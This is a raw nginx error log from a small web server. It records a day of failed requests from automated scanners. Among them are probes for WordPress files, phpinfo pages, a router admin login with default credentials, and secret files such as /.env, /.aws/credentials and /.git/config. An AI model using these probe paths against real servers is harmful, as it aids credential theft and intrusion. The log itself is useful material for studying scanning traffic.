2022/01/13 03:26:36 [error] 7#7: *13 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 91.105.142.28, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 03:35:47 [error] 7#7: *14 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:47 [error] 7#7: *14 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:47 [error] 7#7: *14 open() "/etc/nginx/html/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:48 [error] 7#7: *14 open() "/etc/nginx/html/xmlrpc.php" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /xmlrpc.php?rsd HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:48 [error] 7#7: *14 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:48 [error] 7#7: *14 open() "/etc/nginx/html/blog/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:48 [error] 7#7: *14 open() "/etc/nginx/html/web/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:48 [error] 7#7: *14 open() "/etc/nginx/html/wordpress/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:49 [error] 7#7: *14 open() "/etc/nginx/html/website/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:49 [error] 7#7: *14 open() "/etc/nginx/html/wp/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:49 [error] 7#7: *14 open() "/etc/nginx/html/news/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:49 [error] 7#7: *14 open() "/etc/nginx/html/2020/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:50 [error] 7#7: *14 open() "/etc/nginx/html/2019/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:50 [error] 7#7: *14 open() "/etc/nginx/html/shop/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:50 [error] 7#7: *14 open() "/etc/nginx/html/wp1/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:50 [error] 7#7: *14 open() "/etc/nginx/html/test/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:50 [error] 7#7: *14 open() "/etc/nginx/html/wp2/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:51 [error] 7#7: *14 open() "/etc/nginx/html/site/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:51 [error] 7#7: *14 open() "/etc/nginx/html/cms/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:35:51 [error] 7#7: *14 open() "/etc/nginx/html/sito/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 178.128.123.243, server: 0.0.0.0, request: "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 03:46:15 [error] 7#7: *15 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 136.144.41.6, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80", referrer: "http://44.195.238.80:80/left.html"
2022/01/13 04:49:30 [error] 7#7: *18 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 107.189.12.178, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 04:49:33 [error] 7#7: *19 "/etc/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 107.189.12.178, server: 0.0.0.0, request: "POST /HNAP1/ HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 05:39:52 [error] 7#7: *21 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 200.109.28.12, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 05:40:30 [error] 7#7: *22 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 107.189.12.178, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 05:40:31 [error] 7#7: *23 "/etc/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 107.189.12.178, server: 0.0.0.0, request: "POST /HNAP1/ HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 06:11:09 [error] 7#7: *24 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 192.241.218.206, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/13 06:18:44 [error] 7#7: *27 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 216.218.206.67, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/13 06:21:55 [error] 7#7: *28 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 212.28.71.227, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/13 06:55:10 [error] 7#7: *30 open() "/etc/nginx/html/auth/login" failed (2: No such file or directory), client: 54.206.65.48, server: 0.0.0.0, request: "GET /auth/login HTTP/1.1", host: "44.195.238.80"
2022/01/13 07:06:19 [error] 7#7: *33 open() "/etc/nginx/html/nice ports,/Trinity.txt.bak" failed (2: No such file or directory), client: 45.129.56.200, server: 0.0.0.0, request: "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0"
2022/01/13 07:06:20 [error] 7#7: *31 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 23.129.64.216, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/13 07:10:51 [error] 7#7: *37 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 31.220.3.140, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/13 08:12:45 [error] 7#7: *38 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 213.81.220.201, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 09:03:21 [error] 7#7: *39 open() "/etc/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 175.107.2.194, server: 0.0.0.0, request: "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
2022/01/13 09:28:48 [error] 7#7: *40 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.142.236.43, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/13 09:28:49 [error] 7#7: *41 open() "/etc/nginx/html/robots.txt" failed (2: No such file or directory), client: 185.142.236.43, server: 0.0.0.0, request: "GET /robots.txt HTTP/1.1", host: "44.195.238.80"
2022/01/13 09:28:49 [error] 7#7: *42 open() "/etc/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 185.142.236.43, server: 0.0.0.0, request: "GET /sitemap.xml HTTP/1.1", host: "44.195.238.80"
2022/01/13 09:28:53 [error] 7#7: *43 open() "/etc/nginx/html/.well-known/security.txt" failed (2: No such file or directory), client: 185.142.236.43, server: 0.0.0.0, request: "GET /.well-known/security.txt HTTP/1.1", host: "44.195.238.80"
2022/01/13 09:28:55 [error] 7#7: *44 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 185.142.236.43, server: 0.0.0.0, request: "GET /favicon.ico HTTP/1.1", host: "44.195.238.80"
2022/01/13 09:30:52 [error] 7#7: *46 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 34.140.248.32, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/13 09:40:55 [error] 7#7: *47 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.83.67.254, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/13 09:40:55 [error] 7#7: *48 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 45.83.66.48, server: 0.0.0.0, request: "GET /favicon.ico HTTP/1.1", host: "44.195.238.80"
2022/01/13 10:06:54 [error] 7#7: *50 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 125.64.94.212, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 11:29:15 [error] 7#7: *57 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 183.136.226.3, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 11:29:40 [error] 7#7: *58 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 183.136.226.3, server: 0.0.0.0, request: "GET /favicon.ico HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 11:29:41 [error] 7#7: *59 open() "/etc/nginx/html/robots.txt" failed (2: No such file or directory), client: 183.136.226.3, server: 0.0.0.0, request: "GET /robots.txt HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 12:14:35 [error] 7#7: *60 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 54.250.63.186, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/13 12:14:35 [error] 7#7: *61 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 54.250.63.186, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/13 12:25:59 [error] 7#7: *62 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/13 12:26:00 [error] 7#7: *63 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/13 12:57:18 [error] 7#7: *64 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:18 [error] 7#7: *64 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:18 [error] 7#7: *64 open() "/etc/nginx/html/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:18 [error] 7#7: *64 open() "/etc/nginx/html/xmlrpc.php" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /xmlrpc.php?rsd HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:18 [error] 7#7: *64 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:18 [error] 7#7: *64 open() "/etc/nginx/html/blog/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:18 [error] 7#7: *64 open() "/etc/nginx/html/web/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:18 [error] 7#7: *64 open() "/etc/nginx/html/wordpress/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:18 [error] 7#7: *64 open() "/etc/nginx/html/website/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:19 [error] 7#7: *64 open() "/etc/nginx/html/wp/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:19 [error] 7#7: *64 open() "/etc/nginx/html/news/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:19 [error] 7#7: *64 open() "/etc/nginx/html/2018/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:19 [error] 7#7: *64 open() "/etc/nginx/html/2019/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:19 [error] 7#7: *64 open() "/etc/nginx/html/shop/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:19 [error] 7#7: *64 open() "/etc/nginx/html/wp1/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:19 [error] 7#7: *64 open() "/etc/nginx/html/test/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:19 [error] 7#7: *64 open() "/etc/nginx/html/media/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:19 [error] 7#7: *64 open() "/etc/nginx/html/wp2/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:19 [error] 7#7: *64 open() "/etc/nginx/html/site/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:19 [error] 7#7: *64 open() "/etc/nginx/html/cms/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 12:57:20 [error] 7#7: *64 open() "/etc/nginx/html/sito/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 143.244.154.83, server: 0.0.0.0, request: "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/13 14:14:45 [error] 7#7: *66 open() "/etc/nginx/html/wp-login.php" failed (2: No such file or directory), client: 184.168.103.68, server: 0.0.0.0, request: "GET /wp-login.php HTTP/1.1", host: "leobalbino.com"
2022/01/13 15:13:51 [error] 7#7: *67 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.119.81.108, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/13 15:54:37 [error] 7#7: *68 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 89.248.163.177, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/13 16:10:31 [error] 7#7: *69 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 34.150.158.189, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/13 16:10:31 [error] 7#7: *70 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 34.150.158.189, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/13 17:34:08 [error] 7#7: *71 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 136.144.41.117, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 17:43:29 [error] 7#7: *72 open() "/etc/nginx/html/_profiler/phpinfo" failed (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "GET /_profiler/phpinfo HTTP/1.1", host: "44.195.238.80"
2022/01/13 17:43:29 [error] 7#7: *73 open() "/etc/nginx/html/phpinfo.php" failed (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "GET /phpinfo.php HTTP/1.1", host: "44.195.238.80"
2022/01/13 17:43:30 [error] 7#7: *74 open() "/etc/nginx/html/phpinfo" failed (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "GET /phpinfo HTTP/1.1", host: "44.195.238.80"
2022/01/13 17:43:30 [error] 7#7: *75 open() "/etc/nginx/html/info.php" failed (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "GET /info.php HTTP/1.1", host: "44.195.238.80"
2022/01/13 17:43:31 [error] 7#7: *76 open() "/etc/nginx/html/php.ini" failed (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "GET /php.ini HTTP/1.1", host: "44.195.238.80"
2022/01/13 17:43:31 [error] 7#7: *77 open() "/etc/nginx/html/.aws/credentials" failed (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "GET /.aws/credentials HTTP/1.1", host: "44.195.238.80"
2022/01/13 17:43:32 [error] 7#7: *78 open() "/etc/nginx/html/aws.yml" failed (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "GET /aws.yml HTTP/1.1", host: "44.195.238.80"
2022/01/13 17:43:32 [error] 7#7: *79 open() "/etc/nginx/html/config/aws.yml" failed (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "GET /config/aws.yml HTTP/1.1", host: "44.195.238.80"
2022/01/13 17:43:33 [error] 7#7: *80 open() "/etc/nginx/html/config.js" failed (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "GET /config.js HTTP/1.1", host: "44.195.238.80"
2022/01/13 17:43:33 [error] 7#7: *81 open() "/etc/nginx/html/.env.bak" failed (2: No such file or directory), client: 125.166.0.205, server: 0.0.0.0, request: "GET /.env.bak HTTP/1.1", host: "44.195.238.80"
2022/01/13 18:05:02 [error] 7#7: *82 open() "/etc/nginx/html/portal/redlion" failed (2: No such file or directory), client: 192.241.205.30, server: 0.0.0.0, request: "GET /portal/redlion HTTP/1.1", host: "44.195.238.80"
2022/01/13 18:28:00 [error] 7#7: *83 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 209.17.96.34, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/13 19:03:26 [error] 7#7: *84 open() "/etc/nginx/html/.git/config" failed (2: No such file or directory), client: 170.187.141.11, server: 0.0.0.0, request: "GET /.git/config HTTP/1.1", host: "backend.leobalbino.com"
2022/01/13 19:03:26 [error] 7#7: *85 open() "/etc/nginx/html/.git/config" failed (2: No such file or directory), client: 170.187.141.11, server: 0.0.0.0, request: "GET /.git/config HTTP/1.1", host: "ec2-44-195-238-80.compute-1.amazonaws.com"
